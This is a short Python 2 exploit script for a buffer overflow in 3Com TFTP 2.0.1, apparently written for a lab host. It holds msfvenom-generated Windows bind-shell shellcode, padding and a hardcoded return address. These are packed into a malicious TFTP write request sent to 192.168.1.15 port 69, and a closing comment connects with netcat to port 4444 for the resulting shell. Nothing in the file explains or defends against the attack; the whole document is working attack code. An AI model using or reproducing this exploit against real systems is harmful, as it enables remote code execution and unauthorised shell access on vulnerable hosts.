#!/usr/bin/python2
import socket

#3Com TFTP 2.0.1

#msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f python
buf =  b""
buf += b"\xd9\xcd\xd9\x74\x24\xf4\xbd\x2c\xf5\x0d\xb4\x58\x33"
buf += b"\xc9\xb1\x53\x31\x68\x17\x03\x68\x17\x83\xec\xf1\xef"
buf += b"\x41\x10\x11\x6d\xa9\xe8\xe2\x12\x23\x0d\xd3\x12\x57"
buf += b"\x46\x44\xa3\x13\x0a\x69\x48\x71\xbe\xfa\x3c\x5e\xb1"
buf += b"\x4b\x8a\xb8\xfc\x4c\xa7\xf9\x9f\xce\xba\x2d\x7f\xee"
buf += b"\x74\x20\x7e\x37\x68\xc9\xd2\xe0\xe6\x7c\xc2\x85\xb3"
buf += b"\xbc\x69\xd5\x52\xc5\x8e\xae\x55\xe4\x01\xa4\x0f\x26"
buf += b"\xa0\x69\x24\x6f\xba\x6e\x01\x39\x31\x44\xfd\xb8\x93"
buf += b"\x94\xfe\x17\xda\x18\x0d\x69\x1b\x9e\xee\x1c\x55\xdc"
buf += b"\x93\x26\xa2\x9e\x4f\xa2\x30\x38\x1b\x14\x9c\xb8\xc8"
buf += b"\xc3\x57\xb6\xa5\x80\x3f\xdb\x38\x44\x34\xe7\xb1\x6b"
buf += b"\x9a\x61\x81\x4f\x3e\x29\x51\xf1\x67\x97\x34\x0e\x77"
buf += b"\x78\xe8\xaa\xfc\x95\xfd\xc6\x5f\xf2\x32\xeb\x5f\x02"
buf += b"\x5d\x7c\x2c\x30\xc2\xd6\xba\x78\x8b\xf0\x3d\x7e\xa6"
buf += b"\x45\xd1\x81\x49\xb6\xf8\x45\x1d\xe6\x92\x6c\x1e\x6d"
buf += b"\x62\x90\xcb\x18\x6a\x37\xa4\x3e\x97\x87\x14\xff\x37"
buf += b"\x60\x7f\xf0\x68\x90\x80\xda\x01\x39\x7d\xe5\x3c\xe6"
buf += b"\x08\x03\x54\x06\x5d\x9b\xc0\xe4\xba\x14\x77\x16\xe9"
buf += b"\x0c\x1f\x5f\xfb\x8b\x20\x60\x29\xbc\xb6\xeb\x3e\x78"
buf += b"\xa7\xeb\x6a\x28\xb0\x7c\xe0\xb9\xf3\x1d\xf5\x93\x63"
buf += b"\xbd\x64\x78\x73\xc8\x94\xd7\x24\x9d\x6b\x2e\xa0\x33"
buf += b"\xd5\x98\xd6\xc9\x83\xe3\x52\x16\x70\xed\x5b\xdb\xcc"
buf += b"\xc9\x4b\x25\xcc\x55\x3f\xf9\x9b\x03\xe9\xbf\x75\xe2"
buf += b"\x43\x16\x29\xac\x03\xef\x01\x6f\x55\xf0\x4f\x19\xb9"
buf += b"\x41\x26\x5c\xc6\x6e\xae\x68\xbf\x92\x4e\x96\x6a\x17"
buf += b"\x7e\xdd\x36\x3e\x17\xb8\xa3\x02\x7a\x3b\x1e\x40\x83"
buf += b"\xb8\xaa\x39\x70\xa0\xdf\x3c\x3c\x66\x0c\x4d\x2d\x03"
buf += b"\x32\xe2\x4e\x06"


buffer =  buf + "A" * 118 + "\x4e\xae\x45\x7e" + "C" * 23
#\x4e\xae\x45\x7e

tftppacket = "\x00\x02" + "stelios" + "\x00" + buffer + "\x00"
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftppacket,('192.168.1.15',69))
response = s.recvfrom(2048)
print response

#nc 192.168.1.15 4444
